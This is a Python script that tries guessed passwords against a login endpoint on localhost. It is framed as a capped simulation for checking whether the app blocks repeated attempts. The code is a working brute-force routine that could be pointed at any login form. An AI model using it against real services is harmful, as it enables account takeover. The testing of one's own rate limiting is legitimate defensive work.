import requests
import itertools
import string
import time

# Target configuration
TARGET_URL = "http://localhost:3000/auth/login"
EMAIL = "testusers@gmail.com"  # Replace with a valid user (do not use real production users)
MAX_ATTEMPTS = 100
DELAY_BETWEEN_REQUESTS = 0.1  # seconds (optional throttle)

# Generate all 5-character passwords (lowercase only for demo)
CHARSET = string.ascii_lowercase + string.digits
attempts = itertools.product(CHARSET, repeat=5)

attempt_count = 0

print("Starting brute-force simulation...")

for combo in attempts:
    if attempt_count >= MAX_ATTEMPTS:
        print("Maximum attempts reached. Stopping attack simulation.")
        break

    password_guess = ''.join(combo)

    payload = {
        "email": EMAIL,
        "password": password_guess
    }

    try:
        response = requests.post(TARGET_URL, json=payload)

        if response.status_code == 200:
            print(f"✅ SUCCESS: Password found — {password_guess}")
            break
        elif response.status_code == 403:
            print(f"❌ BLOCKED: IP temporarily blocked after attempt {attempt_count + 1}")
            break
        else:
            print(f"[{attempt_count + 1}] Tried: {password_guess} → Status: {response.status_code}")

        attempt_count += 1
        time.sleep(DELAY_BETWEEN_REQUESTS)

    except Exception as e:
        print(f"Error during request: {e}")
        break
